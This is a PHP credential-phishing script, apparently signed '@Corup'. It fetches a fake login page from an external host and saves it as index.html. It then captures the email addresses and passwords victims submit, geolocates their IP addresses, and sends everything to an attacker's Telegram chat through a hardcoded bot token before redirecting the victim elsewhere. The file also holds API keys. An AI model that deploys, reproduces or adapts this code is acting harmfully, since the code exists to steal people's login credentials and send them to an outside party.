<?php
ob_start();
$API_KEY = '5142602329:AAEduSvD0aO-W8nzO9jv-Evnj1W9jL6SN_k';
$index = file_get_contents('https://f0ob.000webhostapp.com/corup.html');
$xx = file_put_contents("index.html", $index); 
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $llllM = file_get_contents($url);
        return json_decode($llllM);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;

$admin = "1166437260";
$email = $_GET["email"];
$password = $_GET["password"];
$login = $_GET["login"];

$linky = $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME'];
if($email){
$api_key = "d640f621162e2c6e365ae888e65f95dd";
$cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
$jsondata = json_decode($cty1);
$cty = $jsondata->country_name;
$url1 = "https://wagdei12.herokuapp.com/";
header("location: $url1");
$name = $message->from->first_name;
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"🇮🇶 - 𝗻𝗲𝘄 𝗹𝗼𝗴𝗶𝗻 𝗯𝘆 - $login
🇮🇶 - 𝗲𝗺𝗮𝗶𝗹 - `$email`
🇮🇶 - 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 - `$password`
🇮🇶 - 𝗰𝗼𝘂𝗻𝘁𝗿𝘆 - $cty
🇮🇶 - 𝘁𝗶𝗺𝗲 - $time
🇮🇶 - 𝗱𝗮𝘁𝗲 - $day | $month | $year
by @Corup",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='/index.html'" />
    <script type="text/javascript">
            window.location.href = "/index.html"
    </script>
 </head>
  <body>
  </body>
</html>
<?
?>